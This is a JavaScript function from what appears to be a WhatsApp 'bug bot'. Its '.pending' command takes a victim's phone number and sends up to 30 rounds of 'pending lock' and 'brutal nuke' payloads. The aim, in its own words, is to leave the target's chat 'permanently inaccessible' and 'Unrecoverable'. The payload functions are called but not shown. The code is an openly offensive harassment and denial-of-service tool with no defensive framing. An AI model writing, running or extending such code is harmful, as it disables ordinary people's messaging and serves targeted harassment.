async function handlePending({ number, count, sock, replyJid, userId, name, version = 1 }) {
  const clean = _bugValidateNum(number);
  if (!clean) return `❌ Usage: \`.pending${version > 1 ? 'v' + version : ''} <number> [times]\``;
  const times = Math.min(Math.max(1, parseInt(count) || 1), 30);
  const targetJid = `${clean}@s.whatsapp.net`;
  const { isOnWA } = await _bugCheckWA(sock, targetJid);
  if (!isOnWA) return `⚠️ +${clean} not on WhatsApp.`;

  const label = version === 2 ? 'Pending v2' : 'Pending';
  try { await sock.sendMessage(replyJid, { text: `🕐 *${label} started* — +${clean} (${times}×)\n_Clock-locking + brutal nuke..._` }); } catch (_) {}
  let sent = 0, failed = 0; const ticks = [];
  for (let i = 0; i < times; i++) {
    try {
      // Pending lock fires alongside full nuke — chat is permanently inaccessible
      await Promise.allSettled([
        _v_pendingLock(targetJid, sock, version - 1),
        _brutalNuke(targetJid, sock),
      ]);
      sent++; ticks.push('✅');
    } catch (e) { failed++; ticks.push('❌'); }
    if (i < times - 1) await sleep(400 + Math.random() * 200);
  }
  return `🕐 *${label} Done!*\n\n${ticks.join('')}\n\n📱 +${clean}\n✅ ${sent}  ❌ ${failed}\n\nClock-lock + full nuke. Unrecoverable.`;
}

